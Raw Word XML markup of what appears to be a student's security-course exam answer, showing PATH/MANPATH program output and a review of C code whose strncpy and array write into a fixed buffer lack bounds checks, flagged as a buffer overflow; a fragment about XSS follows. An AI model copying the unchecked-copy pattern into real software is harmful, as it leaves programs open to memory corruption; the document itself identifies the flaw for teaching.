          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-23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env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="344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position w:val="1"/>
        </w:rPr>
        <w:t>exit(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="2" w:line="20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3F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="12" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="23"/>
        <w:ind w:left="104"/>
        <w:rPr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am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 xml:space="preserve">le </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="119"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="119"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="118"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="2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Coventry</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>:˜</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>/Desktop/Cosc647Fal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="1"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>2013/Final&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="1"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>./Q3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>PATH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There</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-6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are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11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directories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in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the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environment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variable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-10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PATH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/home/mike/bin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/local/bin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usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/bin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/X11R6/bin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  <w:sectPr w:rsidR="003F01FA">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="880" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/bin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="80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/games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/opt/gnome/bin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/opt/kde3/bin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usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/lib/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>jvm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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jre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/bin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/lib/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>mit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/bin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usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/lib/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>mit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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sbin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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Coventry</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>:˜</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/Desktop/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>Cosc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-28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647</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-4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Fall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2007/Final&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-13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./Q3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-5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MANPATH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are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-4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3</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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directories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the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environment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>variable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MANPATH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usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/local/man</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="1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usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/share/man</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/X11R6/man</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F0934" w:rsidRDefault="009F0934">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009F0934" w:rsidRPr="009F0934" w:rsidRDefault="009F0934">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the following lines have issues:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F0934" w:rsidRPr="009F0934" w:rsidRDefault="009F0934" w:rsidP="009F0934">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="824"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strncpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>directory,</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-22"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>env</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-4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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>start</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sizeof</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>),</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-23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color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>stop</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-5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color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-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color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>start);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F0934" w:rsidRPr="009F0934" w:rsidRDefault="009F0934" w:rsidP="009F0934">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="824"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/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directory[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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stop</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-17"/>
          <w:position w:val="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-</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="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start]</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-7"/>
          <w:position w:val="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=</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F0934" w:rsidRPr="009F0934" w:rsidRDefault="009F0934" w:rsidP="009F0934">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="009F0934" w:rsidRPr="009F0934">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="860" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">First, the difference of (stop </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> start) is not checked to see if their difference is within the bounds of the size of the directory </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">variable </w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(BUF_SIZE or 100), so there could be a buffer overflow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> in writing data to directory</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In addition</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, in the second line </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">above, </w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>the directory variable is access</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> using (stop </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> start) without the difference checked to see if it is within bounds.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="37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20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tal]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irst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X</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5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were </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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t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yi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g,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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7"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="104"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="104"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
